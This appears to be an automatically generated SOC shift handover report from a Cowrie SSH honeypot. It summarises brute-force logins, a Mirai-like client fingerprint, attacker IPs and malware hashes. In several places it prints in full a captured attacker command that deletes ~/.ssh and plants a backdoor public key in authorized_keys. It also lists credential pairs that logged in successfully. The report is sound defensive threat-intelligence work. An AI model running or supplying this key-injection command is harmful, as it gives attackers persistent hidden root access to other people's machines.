# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-18 |
| **Generated At** | 2026-05-18T21:16:34Z |
| **Shift Time** | 21:16 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **76** |
| Confirmed Threats | **65** |
| False Positives Filtered | **11** (14.5%) |
| Unique Attacker IPs | **15** |
| Countries of Origin | **11** |
| High Severity Cases | **8** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **68** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **12** |
| Unique Credential Pairs | **5** |
| Unique Usernames | **2** |
| Unique Passwords | **5** |
| Successful Auth Pairs | **8** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 8 |
| `345gs5662d34` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 4 |
| `3245gs5662d34` | 4 |
| `daniel` | 2 |
| `1qaz!QAZ2wsx@WSX` | 1 |
| `t` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `3245gs5662d34` | 4 |
| `root` | `daniel` | 2 |
| `root` | `1qaz!QAZ2wsx@WSX` | 1 |
| `root` | `t` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `daniel` | `20.243.208.191` | 2026-05-18T20:24:55 |
| `root` | `3245gs5662d34` | `20.243.208.191` | 2026-05-18T20:24:59 |
| `root` | `1qaz!QAZ2wsx@WSX` | `128.251.36.68` | 2026-05-18T20:26:27 |
| `root` | `3245gs5662d34` | `128.251.36.68` | 2026-05-18T20:26:31 |
| `root` | `daniel` | `103.217.144.113` | 2026-05-18T20:28:52 |
| `root` | `3245gs5662d34` | `103.217.144.113` | 2026-05-18T20:28:57 |
| `root` | `t` | `43.159.137.23` | 2026-05-18T20:30:29 |
| `root` | `3245gs5662d34` | `43.159.137.23` | 2026-05-18T20:30:35 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **76** |
| Sessions with Fingerprint | **1** |
| Unique HASSH Fingerprints | **1** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 12 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 12 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 12 | 4 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `43.159.137.23`, `20.243.208.191`, `103.217.144.113`, `128.251.36.68`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **15** |
| Unique ASNs | **12** |
| High-Risk ASNs | **6** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS21246` | IPKO Telecommunications LLC | 1 | LOW |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 1 | MEDIUM |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 1 | HIGH |
| `AS136052` | PT Cloud Hosting Indonesia | 1 | HIGH |
| `AS62068` | SpectraIP B.V. | 1 | HIGH |
| `AS29256` | STE PDN Internal AS | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (8)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1a52696c78af

| Field | Detail |
|---|---|
| **Source IP** | `20.243.208[.]191` |
| **First Seen** | 2026-05-18 20:24 |
| **Last Seen** | 2026-05-18 20:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 20:24:54` | `cowrie.session.connect` |
| `2026-05-18 20:24:54` | `cowrie.client.version` |
| `2026-05-18 20:24:54` | `cowrie.client.kex` |
| `2026-05-18 20:24:55` | `cowrie.login.success` |
| `2026-05-18 20:24:55` | `cowrie.session.params` |
| `2026-05-18 20:24:55` | `cowrie.command.input` |
| `2026-05-18 20:24:55` | `cowrie.command.failed` |
| `2026-05-18 20:24:55` | `cowrie.log.closed` |
| `2026-05-18 20:24:56` | `cowrie.session.params` |
| `2026-05-18 20:24:56` | `cowrie.command.input` |
| `2026-05-18 20:24:56` | `cowrie.session.file_download` |
| `2026-05-18 20:24:56` | `cowrie.log.closed` |
| `2026-05-18 20:24:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.243.208[.]191` to AbuseIPDB if not already reported
- [ ] Block `20.243.208[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b28949782df2

| Field | Detail |
|---|---|
| **Source IP** | `20.243.208[.]191` |
| **First Seen** | 2026-05-18 20:24 |
| **Last Seen** | 2026-05-18 20:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 20:24:58` | `cowrie.session.connect` |
| `2026-05-18 20:24:58` | `cowrie.client.version` |
| `2026-05-18 20:24:58` | `cowrie.client.kex` |
| `2026-05-18 20:24:59` | `cowrie.login.success` |
| `2026-05-18 20:24:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.243.208[.]191` to AbuseIPDB if not already reported
- [ ] Block `20.243.208[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b730e91431b

| Field | Detail |
|---|---|
| **Source IP** | `128.251.36[.]68` |
| **First Seen** | 2026-05-18 20:26 |
| **Last Seen** | 2026-05-18 20:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 20:26:26` | `cowrie.session.connect` |
| `2026-05-18 20:26:26` | `cowrie.client.version` |
| `2026-05-18 20:26:26` | `cowrie.client.kex` |
| `2026-05-18 20:26:27` | `cowrie.login.success` |
| `2026-05-18 20:26:27` | `cowrie.session.params` |
| `2026-05-18 20:26:27` | `cowrie.command.input` |
| `2026-05-18 20:26:27` | `cowrie.command.failed` |
| `2026-05-18 20:26:28` | `cowrie.log.closed` |
| `2026-05-18 20:26:28` | `cowrie.session.params` |
| `2026-05-18 20:26:28` | `cowrie.command.input` |
| `2026-05-18 20:26:28` | `cowrie.session.file_download` |
| `2026-05-18 20:26:28` | `cowrie.log.closed` |
| `2026-05-18 20:26:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.251.36[.]68` to AbuseIPDB if not already reported
- [ ] Block `128.251.36[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-637eb2681bcf

| Field | Detail |
|---|---|
| **Source IP** | `128.251.36[.]68` |
| **First Seen** | 2026-05-18 20:26 |
| **Last Seen** | 2026-05-18 20:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 20:26:30` | `cowrie.session.connect` |
| `2026-05-18 20:26:30` | `cowrie.client.version` |
| `2026-05-18 20:26:30` | `cowrie.client.kex` |
| `2026-05-18 20:26:31` | `cowrie.login.success` |
| `2026-05-18 20:26:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.251.36[.]68` to AbuseIPDB if not already reported
- [ ] Block `128.251.36[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d102ebfc9978

| Field | Detail |
|---|---|
| **Source IP** | `103.217.144[.]113` |
| **First Seen** | 2026-05-18 20:28 |
| **Last Seen** | 2026-05-18 20:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 20:28:51` | `cowrie.session.connect` |
| `2026-05-18 20:28:51` | `cowrie.client.version` |
| `2026-05-18 20:28:52` | `cowrie.client.kex` |
| `2026-05-18 20:28:52` | `cowrie.login.success` |
| `2026-05-18 20:28:53` | `cowrie.session.params` |
| `2026-05-18 20:28:53` | `cowrie.command.input` |
| `2026-05-18 20:28:53` | `cowrie.command.failed` |
| `2026-05-18 20:28:53` | `cowrie.log.closed` |
| `2026-05-18 20:28:53` | `cowrie.session.params` |
| `2026-05-18 20:28:53` | `cowrie.command.input` |
| `2026-05-18 20:28:54` | `cowrie.session.file_download` |
| `2026-05-18 20:28:54` | `cowrie.log.closed` |
| `2026-05-18 20:28:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.217.144[.]113` to AbuseIPDB if not already reported
- [ ] Block `103.217.144[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-045874544cd3

| Field | Detail |
|---|---|
| **Source IP** | `103.217.144[.]113` |
| **First Seen** | 2026-05-18 20:28 |
| **Last Seen** | 2026-05-18 20:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 20:28:56` | `cowrie.session.connect` |
| `2026-05-18 20:28:56` | `cowrie.client.version` |
| `2026-05-18 20:28:56` | `cowrie.client.kex` |
| `2026-05-18 20:28:57` | `cowrie.login.success` |
| `2026-05-18 20:28:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.217.144[.]113` to AbuseIPDB if not already reported
- [ ] Block `103.217.144[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec4abd0d2f68

| Field | Detail |
|---|---|
| **Source IP** | `43.159.137[.]23` |
| **First Seen** | 2026-05-18 20:30 |
| **Last Seen** | 2026-05-18 20:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 20:30:28` | `cowrie.session.connect` |
| `2026-05-18 20:30:28` | `cowrie.client.version` |
| `2026-05-18 20:30:28` | `cowrie.client.kex` |
| `2026-05-18 20:30:29` | `cowrie.login.success` |
| `2026-05-18 20:30:30` | `cowrie.session.params` |
| `2026-05-18 20:30:30` | `cowrie.command.input` |
| `2026-05-18 20:30:30` | `cowrie.command.failed` |
| `2026-05-18 20:30:30` | `cowrie.log.closed` |
| `2026-05-18 20:30:30` | `cowrie.session.params` |
| `2026-05-18 20:30:30` | `cowrie.command.input` |
| `2026-05-18 20:30:31` | `cowrie.session.file_download` |
| `2026-05-18 20:30:31` | `cowrie.log.closed` |
| `2026-05-18 20:30:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.159.137[.]23` to AbuseIPDB if not already reported
- [ ] Block `43.159.137[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8225e1249dc4

| Field | Detail |
|---|---|
| **Source IP** | `43.159.137[.]23` |
| **First Seen** | 2026-05-18 20:30 |
| **Last Seen** | 2026-05-18 20:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 20:30:34` | `cowrie.session.connect` |
| `2026-05-18 20:30:34` | `cowrie.client.version` |
| `2026-05-18 20:30:34` | `cowrie.client.kex` |
| `2026-05-18 20:30:35` | `cowrie.login.success` |
| `2026-05-18 20:30:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.159.137[.]23` to AbuseIPDB if not already reported
- [ ] Block `43.159.137[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `206.135.171[.]139` | **25** | 2026-05-18 20:42 | 2026-05-18 20:47 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `45.148.120[.]187` | **20** | 2026-05-18 19:48 | 2026-05-18 21:10 | 24m | 0 | `T1592` | 🟠 MEDIUM |
| `185.225.42[.]71` | **6** | 2026-05-18 20:44 | 2026-05-18 20:54 | 12m | 0 | `T1592` | 🟢 LOW |
| `103.217.144[.]113` | 1 | 2026-05-18 20:28 | 2026-05-18 20:28 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `123.184.61[.]50` | 1 | 2026-05-18 19:49 | 2026-05-18 19:50 | 14s | 0 | `T1592` | 🟢 LOW |
| `128.251.36[.]68` | 1 | 2026-05-18 20:26 | 2026-05-18 20:26 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.243.208[.]191` | 1 | 2026-05-18 20:24 | 2026-05-18 20:24 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.159.137[.]23` | 1 | 2026-05-18 20:30 | 2026-05-18 20:30 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.251.13[.]59` | 1 | 2026-05-18 21:05 | 2026-05-18 21:06 | 10s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `123.184.61[.]50` | CN | CHINANET liaoning province network | **100** ⚠️ | 9 |
| `128.251.36[.]68` | IE | Microsoft Limited | **100** ⚠️ | 3 |
| `43.159.137[.]23` | US | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 3 |
| `20.243.208[.]191` | JP | Microsoft Corporation | **100** ⚠️ | 10 |
| `103.217.144[.]113` | ID | PT Guna Bahan Inti | **100** ⚠️ | 50 |
| `47.251.13[.]59` | US | Alibaba Cloud - US | **100** ⚠️ | 0 |
| `45.148.120[.]187` | NL | SpectraIP B.V. | **100** ⚠️ | 0 |
| `206.135.171[.]139` | PK | Cyber Internet Services (Pvt.) Ltd. | **89** ⚠️ | 3 |
| `185.225.42[.]71` | SY | Tarassul Internet Service Provider | **81** ⚠️ | 2 |
| `190.102.52[.]156` | BR | J. S. dos Santos Junior Comunicações ME | **57** | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 12 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 8 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 4 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |

---

## 🔕 False Positive Summary (11 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 6 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 76 cases |
| Tool 34  | Credential Extractor        | ✅ 12 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 1 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 15 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 11 filtered (14.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 12 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 8 priority case(s) shown individually · 9 recon entry/entries in table (3 group(s) consolidating 51 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
